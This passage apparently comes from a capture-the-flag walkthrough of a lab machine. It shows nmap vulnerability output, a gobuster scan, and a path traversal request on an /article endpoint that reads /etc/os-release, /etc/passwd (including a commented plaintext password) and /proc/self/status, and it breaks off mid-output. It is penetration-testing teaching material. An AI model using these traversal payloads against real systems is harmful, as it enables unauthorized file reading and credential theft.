\tMSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tEXPLOITPACK:98FE96309F9524B8C84C508837551A19\t5.8\thttps://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19\t*EXPLOIT*\n|     \tEXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t5.8\thttps://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t*EXPLOIT*\n|     \tEDB-ID:46516\t5.8\thttps://vulners.com/exploitdb/EDB-ID:46516\t*EXPLOIT*\n|     \tEDB-ID:46193\t5.8\thttps://vulners.com/exploitdb/EDB-ID:46193\t*EXPLOIT*\n|     \tCVE-2019-6111\t5.8\thttps://vulners.com/cve/CVE-2019-6111\n|     \t1337DAY-ID-32328\t5.8\thttps://vulners.com/zdt/1337DAY-ID-32328\t*EXPLOIT*\n|     \t1337DAY-ID-32009\t5.8\thttps://vulners.com/zdt/1337DAY-ID-32009\t*EXPLOIT*\n|     \tSSH_ENUM\t5.0\thttps://vulners.com/canvas/SSH_ENUM\t*EXPLOIT*\n|     \tPACKETSTORM:150621\t5.0\thttps://vulners.com/packetstorm/PACKETSTORM:150621\t*EXPLOIT*\n|     \tMSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t5.0\thttps://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t*EXPLOIT*\n|     \tEXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t5.0\thttps://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t*EXPLOIT*\n|     \tEXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t5.0\thttps://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t*EXPLOIT*\n|     \tEDB-ID:45939\t5.0\thttps://vulners.com/exploitdb/EDB-ID:45939\t*EXPLOIT*\n|     \tEDB-ID:45233\t5.0\thttps://vulners.com/exploitdb/EDB-ID:45233\t*EXPLOIT*\n|     \tCVE-2018-15919\t5.0\thttps://vulners.com/cve/CVE-2018-15919\n|     \tCVE-2018-15473\t5.0\thttps://vulners.com/cve/CVE-2018-15473\n|     \t1337DAY-ID-31730\t5.0\thttps://vulners.com/zdt/1337DAY-ID-31730\t*EXPLOIT*\n|     \tCVE-2021-41617\t4.4\thttps://vulners.com/cve/CVE-2021-41617\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t*EXPLOIT*\n|     \tCVE-2020-14145\t4.3\thttps://vulners.com/cve/CVE-2020-14145\n|     \tCVE-2019-6110\t4.0\thttps://vulners.com/cve/CVE-2019-6110\n|     \tCVE-2019-6109\t4.0\thttps://vulners.com/cve/CVE-2019-6109\n|     \tCVE-2018-20685\t2.6\thttps://vulners.com/cve/CVE-2018-20685\n|     \tPACKETSTORM:151227\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:151227\t*EXPLOIT*\n|_    \t1337DAY-ID-30937\t0.0\thttps://vulners.com/zdt/1337DAY-ID-30937\t*EXPLOIT*\n80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server&#039;s resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       http://ha.ckers.org/slowloris/\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-server-header: Werkzeug/0.16.0 Python/3.6.9\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n| http-fileupload-exploiter: \n|   \n|_    Couldn&#039;t find a file-type field.\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n| vulners: \n|   cpe:/a:python:python:3.6.9: \n|     \tCVE-2021-3177\t7.5\thttps://vulners.com/cve/CVE-2021-3177\n|     \tCVE-2020-27619\t7.5\thttps://vulners.com/cve/CVE-2020-27619\n|     \tCVE-2020-8492\t7.1\thttps://vulners.com/cve/CVE-2020-8492\n|     \tCVE-2020-26116\t6.4\thttps://vulners.com/cve/CVE-2020-26116\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-16056/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-16056/\t*EXPLOIT*\n|     \tCVE-2019-9636\t5.0\thttps://vulners.com/cve/CVE-2019-9636\n|     \tCVE-2019-16056\t5.0\thttps://vulners.com/cve/CVE-2019-16056\n|     \tCVE-2018-20852\t5.0\thttps://vulners.com/cve/CVE-2018-20852\n|     \tCVE-2018-20406\t5.0\thttps://vulners.com/cve/CVE-2018-20406\n|     \tCVE-2018-1060\t5.0\thttps://vulners.com/cve/CVE-2018-1060\n|     \tMSF:ILITIES/SUSE-CVE-2020-14422/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2020-14422/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2020-8315/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-8315/\t*EXPLOIT*\n|     \tCVE-2021-28359\t4.3\thttps://vulners.com/cve/CVE-2021-28359\n|     \tCVE-2020-8315\t4.3\thttps://vulners.com/cve/CVE-2020-8315\n|     \tCVE-2020-14422\t4.3\thttps://vulners.com/cve/CVE-2020-14422\n|     \tCVE-2019-9947\t4.3\thttps://vulners.com/cve/CVE-2019-9947\n|     \tCVE-2019-9740\t4.3\thttps://vulners.com/cve/CVE-2019-9740\n|     \tCVE-2019-18348\t4.3\thttps://vulners.com/cve/CVE-2019-18348\n|     \tCVE-2019-16935\t4.3\thttps://vulners.com/cve/CVE-2019-16935\n|     \tCVE-2021-23336\t4.0\thttps://vulners.com/cve/CVE-2021-23336\n|     \tMSF:ILITIES/DEBIAN-CVE-2021-3426/\t2.7\thttps://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2021-3426/\t*EXPLOIT*\n|_    \tCVE-2021-3426\t2.7\thttps://vulners.com/cve/CVE-2021-3426\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=2/1%OT=22%CT=1%CU=40063%PV=Y%DS=4%DC=T%G=Y%TM=61F9EB2E\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=102%TI=Z%CI=Z%TS=A)OPS(O1=M5\nOS:06ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O\nOS:6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%D\nOS:F=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0\nOS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=\nOS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%\nOS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I\nOS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nUptime guess: 48.616 days (since Wed Dec 15 04:37:20 2021)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=258 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8888/tcp)\nHOP RTT       ADDRESS\n1   38.25 ms  10.13.0.1\n2   ... 3\n4   170.72 ms 10.10.0.57\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Feb  1 19:23:42 2022 -- 1 IP address (1 host up) scanned in 1505.56 seconds\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;So, we’ve got a Linux box running &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; and some weird-ass httpd server on port 80.&lt;/p&gt;\n&lt;p&gt;We’ll also hit 10.10.0.57 with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/gobuster&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 50&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http://10.10.0.57&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This only detects the /article endpoint I noted while poking around the site. (I could hit the site with a larger wordlist, but it doesn’t seem worth it.)&lt;/p&gt;\n&lt;p&gt;I’m going to go out on a limb here and guess that we’re going to exploit the /article endpoint, which probably &lt;em&gt;is&lt;/em&gt; just pulling in files verbatim.&lt;/p&gt;\n&lt;p&gt;A common file on Linux systems is /etc/os-release, so let’s see if we can include this. And, in fact, after a little experimentation it turns out that we can using &lt;code&gt;http://10.10.0.57/article?name=../../../etc/os-release&lt;/code&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Ubuntu&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;VERSION&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;18.04.3 LTS (Bionic Beaver)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ubuntu&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ID_LIKE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;debian&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PRETTY_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Ubuntu 18.04.3 LTS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;VERSION_ID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;18.04&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;HOME_URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://www.ubuntu.com/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SUPPORT_URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://help.ubuntu.com/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;BUG_REPORT_URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://bugs.launchpad.net/ubuntu/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PRIVACY_POLICY_URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;VERSION_CODENAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;bionic&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;UBUNTU_CODENAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;bionic&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;(It looks like /article must be doing some simple escaping too.)&lt;/p&gt;\n&lt;p&gt;Let’s grab /etc/passwd so we know which users are running on the system.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;passwd&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;passwd&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;sys:x:3:3:sys:/dev:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;sync:x:4:65534:sync:/bin:/bin/sync&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;games:x:5:60:games:/usr/games:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;syslog:x:102:106::/home/syslog:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;messagebus:x:103:107::/nonexistent:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;_apt:x:104:65534::/nonexistent:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;lxd:x:105:65534::/var/lib/lxd/:/bin/false&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;pollinate:x:109:1::/var/cache/pollinate:/bin/false&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;#falconfeast:rootpassword&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;sshd:x:110:65534::/run/sshd:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;I wonder who the current process is running as? /proc/self/status should have the answer.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;proc&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;proc&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Name:\tflask&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Umask:\t0022&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;State:\tS (sleeping)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Tgid:\t567&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Ngid:\t0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Pid:\t567&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;PPid:\t1&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;TracerPid:\t0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Uid:\t0\t0\t0\t0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Gid:\t0\t0\t0\t0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;FDSize:\t128&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Groups:\t &lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;NStgid:\t567&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;NSpid:\t567&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;NSpgid:\t567&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;NSsid:\t567&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmPeak:\t  751740 